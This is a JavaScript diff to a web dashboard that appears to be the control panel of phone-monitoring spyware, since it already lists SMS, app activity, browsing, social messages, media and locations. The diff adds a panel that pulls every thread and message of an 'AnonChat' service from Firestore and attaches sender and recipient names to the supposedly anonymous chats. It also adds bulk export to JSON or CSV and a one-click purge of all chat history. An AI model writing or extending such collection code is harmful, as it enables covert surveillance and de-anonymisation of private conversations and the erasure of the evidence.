@@ -25,7 +25,8 @@ let cachedData = {
     web: [],
     social: [],
     media: [],
-    locations: []
+    locations: [],
+    anonchat: []
 };
 
 let unsubs = [];
@@ -233,6 +234,46 @@ function listenToDataCollections() {
         cachedData.media = s.docs.map(d => d.data()).sort((a,b) => (b.timestamp||0) - (a.timestamp||0));
         renderMediaPanel();
     }, err => handleSubErr("Media", err)));
+
+    // 8. AnonChat Messages
+    unsubs.push(db.collection('chats').onSnapshot(chatsSnap => {
+        let allMsgs = [];
+        let pending = chatsSnap.docs.length;
+        if (pending === 0) {
+            cachedData.anonchat = [];
+            renderAnonChatPanel();
+            return;
+        }
+        chatsSnap.docs.forEach(cDoc => {
+            const chatData = cDoc.data();
+            cDoc.ref.collection('messages').orderBy('timestamp', 'desc').limit(200).get().then(mSnap => {
+                mSnap.docs.forEach(mDoc => {
+                    const m = mDoc.data();
+                    allMsgs.push({
+                        id: mDoc.id,
+                        chatId: cDoc.id,
+                        sender_name: m.senderName || chatData.participantNames?.[m.senderId] || 'Anonymous',
+                        recipient_name: Object.values(chatData.participantNames || {}).find(n => n !== (m.senderName || chatData.participantNames?.[m.senderId])) || 'Anonymous',
+                        content: m.content || '',
+                        type: m.type || 'text',
+                        image_url: m.imageUrl,
+                        timestamp: m.timestamp
+                    });
+                });
+                pending--;
+                if (pending <= 0) {
+                    cachedData.anonchat = allMsgs.sort((a,b) => (b.timestamp||0) - (a.timestamp||0));
+                    renderAnonChatPanel();
+                }
+            }).catch(() => {
+                pending--;
+                if (pending <= 0) {
+                    cachedData.anonchat = allMsgs.sort((a,b) => (b.timestamp||0) - (a.timestamp||0));
+                    renderAnonChatPanel();
+                }
+            });
+        });
+    }));
 }
 
 function handleSubErr(name, err) {
@@ -290,6 +331,7 @@ function updateBadges() {
     const fWeb = filterList(cachedData.web, [w => w.title, w => w.url]);
     const fSoc = filterList(cachedData.social, [s => s.app_name, s => s.sender, s => s.content]);
     const fMed = filterList(cachedData.media, [m => m.filename, m => m.mime_type]);
+    const fChat = filterList(cachedData.anonchat, [c => c.sender_name, c => c.recipient_name, c => c.content]);
 
     document.getElementById('badgeActivity').textContent = searchQuery ? `${fAct.length}/${cachedData.activity.length}` : cachedData.activity.length;
     document.getElementById('badgeSMS').textContent = searchQuery ? `${fSMS.length}/${cachedData.sms.length}` : cachedData.sms.length;
@@ -297,6 +339,8 @@ function updateBadges() {
     document.getElementById('badgeApps').textContent = searchQuery ? `${fApps.length}/${cachedData.apps.length}` : cachedData.apps.length;
     document.getElementById('badgeWeb').textContent = searchQuery ? `${fWeb.length}/${cachedData.web.length}` : cachedData.web.length;
     document.getElementById('badgeSocial').textContent = searchQuery ? `${fSoc.length}/${cachedData.social.length}` : cachedData.social.length;
+    const badgeChat = document.getElementById('badgeAnonChat');
+    if (badgeChat) badgeChat.textContent = searchQuery ? `${fChat.length}/${cachedData.anonchat.length}` : cachedData.anonchat.length;
     document.getElementById('badgeMedia').textContent = searchQuery ? `${fMed.length}/${cachedData.media.length}` : cachedData.media.length;
 }
 
@@ -486,6 +530,109 @@ function renderMediaPanel() {
     `).join('');
 }
 
+function renderAnonChatPanel() {
+    updateBadges();
+    const items = filterList(cachedData.anonchat, [c => c.sender_name, c => c.recipient_name, c => c.content]);
+    const panel = document.getElementById('panel-anonchat');
+    if (!panel) return;
+    const listContainer = document.getElementById('anonchatListContainer');
+    if (!listContainer) return;
+
+    if (items.length === 0) {
+        listContainer.innerHTML = '<div class="empty-state">No AnonChat messages found</div>';
+        return;
+    }
+
+    listContainer.innerHTML = items.map((m, idx) => `
+        <div class="activity-item">
+            <div class="activity-row" id="chat-row-${idx}" onclick="toggleRow('chat', ${idx})">
+                <span class="activity-arrow" id="chat-arrow-${idx}">▶</span>
+                <div class="activity-app-icon">💬</div>
+                <div class="activity-main">
+                    <div class="activity-name"><strong style="color:#818cf8;">${esc(m.sender_name)}</strong> &rarr; <strong style="color:#a78bfa;">${esc(m.recipient_name)}</strong></div>
+                    <div class="activity-pkg">${esc(m.content || (m.image_url ? '📷 Photo' : ''))}</div>
+                </div>
+                <span class="activity-time">${formatTime(m.timestamp)}</span>
+            </div>
+            <div class="activity-detail" id="chat-detail-${idx}">
+                <div class="activity-detail-grid">
+                    <div class="activity-detail-field"><div class="activity-detail-label">Sender</div><div class="activity-detail-value">${esc(m.sender_name)}</div></div>
+                    <div class="activity-detail-field"><div class="activity-detail-label">Recipient</div><div class="activity-detail-value">${esc(m.recipient_name)}</div></div>
+                    <div class="activity-detail-field"><div class="activity-detail-label">Chat Thread</div><div class="activity-detail-value">${esc(m.chatId)}</div></div>
+                    <div class="activity-detail-field"><div class="activity-detail-label">Date & Time</div><div class="activity-detail-value">${formatFullTime(m.timestamp)}</div></div>
+                </div>
+                <div style="margin-top:10px; font-size:13px; background:rgba(255,255,255,0.03); padding:10px; border-radius:6px;">
+                    ${esc(m.content)}
+                    ${m.image_url ? `<div style="margin-top:8px;"><a href="${esc(m.image_url)}" target="_blank" style="color:#38bdf8;">📷 View Photo Attachment</a></div>` : ''}
+                </div>
+            </div>
+        </div>
+    `).join('');
+}
+
+function exportFirebaseChats(format) {
+    const list = cachedData.anonchat || [];
+    if (list.length === 0) {
+        showToast('No messages to export');
+        return;
+    }
+    let dataStr = '';
+    let mimeType = 'text/plain';
+    let filename = `anonchat_export_${Date.now()}`;
+
+    if (format === 'json') {
+        dataStr = 'data:text/json;charset=utf-8,' + encodeURIComponent(JSON.stringify(list, null, 2));
+        mimeType = 'application/json';
+        filename += '.json';
+    } else {
+        const headers = ['ID', 'Chat ID', 'Sender', 'Recipient', 'Type', 'Content', 'Image URL', 'Timestamp', 'Date'];
+        const rows = list.map(m => [
+            `"${(m.id||'').replace(/"/g, '""')}"`,
+            `"${(m.chatId||'').replace(/"/g, '""')}"`,
+            `"${(m.sender_name||'').replace(/"/g, '""')}"`,
+            `"${(m.recipient_name||'').replace(/"/g, '""')}"`,
+            `"${(m.type||'text').replace(/"/g, '""')}"`,
+            `"${(m.content||'').replace(/"/g, '""')}"`,
+            `"${(m.image_url||'').replace(/"/g, '""')}"`,
+            m.timestamp || '',
+            `"${formatFullTime(m.timestamp)}"`
+        ]);
+        const csvContent = [headers.join(','), ...rows.map(r => r.join(','))].join('\n');
+        dataStr = 'data:text/csv;charset=utf-8,' + encodeURIComponent(csvContent);
+        filename += '.csv';
+    }
+
+    const a = document.createElement('a');
+    a.setAttribute('href', dataStr);
+    a.setAttribute('download', filename);
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+    showToast(`Exported ${list.length} chat messages!`);
+}
+
+async function purgeFirebaseChats() {
+    if (!confirm('⚠️ Are you sure you want to PERMANENTLY ERASE all AnonChat history from Firestore? This cannot be undone.')) {
+        return;
+    }
+    showToast('Erasing chats...');
+    try {
+        const chatsSnap = await db.collection('chats').get();
+        const batch = db.batch();
+        for (const cDoc of chatsSnap.docs) {
+            const msgsSnap = await cDoc.ref.collection('messages').get();
+            msgsSnap.docs.forEach(mDoc => batch.delete(mDoc.ref));
+            batch.delete(cDoc.ref);
+        }
+        await batch.commit();
+        cachedData.anonchat = [];
+        renderAnonChatPanel();
+        showToast('All AnonChat history has been permanently erased.');
+    } catch (e) {
+        showToast('Purge error: ' + e.message);
+    }
+}
+
 function showTab(name) {
     document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
     document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
@@ -518,6 +665,7 @@ function onSearchInput() {
     renderWebPanel();
     renderSocialPanel();
     renderMediaPanel();
+    renderAnonChatPanel();
 }
 
 function onLimitChange() {
